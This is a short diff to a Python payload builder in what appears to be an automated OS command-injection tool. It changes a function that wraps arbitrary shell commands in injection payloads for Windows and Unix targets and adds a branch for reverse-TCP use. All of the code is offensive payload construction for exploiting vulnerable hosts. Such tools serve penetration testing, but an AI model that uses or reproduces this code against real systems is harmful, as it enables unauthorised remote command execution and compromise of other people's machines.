@@ -89,11 +89,15 @@ Execute shell commands on vulnerable host.
 """
 def cmd_execution(separator, TAG, cmd):
   if settings.TARGET_OS == "win":
-    payload = (separator +
-              "for /f \"tokens=*\" %i in ('cmd /c \"" + 
-              cmd + 
-              "\"') do @set /p = " + TAG + TAG + "%i" + TAG + TAG + "< nul"
-              )
+    if settings.REVERSE_TCP:
+      payload = (separator + cmd + " "
+                )
+    else:
+      payload = (separator +
+                "for /f \"tokens=*\" %i in ('cmd /c \"" + 
+                cmd + 
+                "\"') do @set /p = " + TAG + TAG + "%i" + TAG + TAG + "< nul"
+                )
   else:       
     if not settings.WAF_ENABLED:
       cmd_exec = "$(echo $(" + cmd + "))"
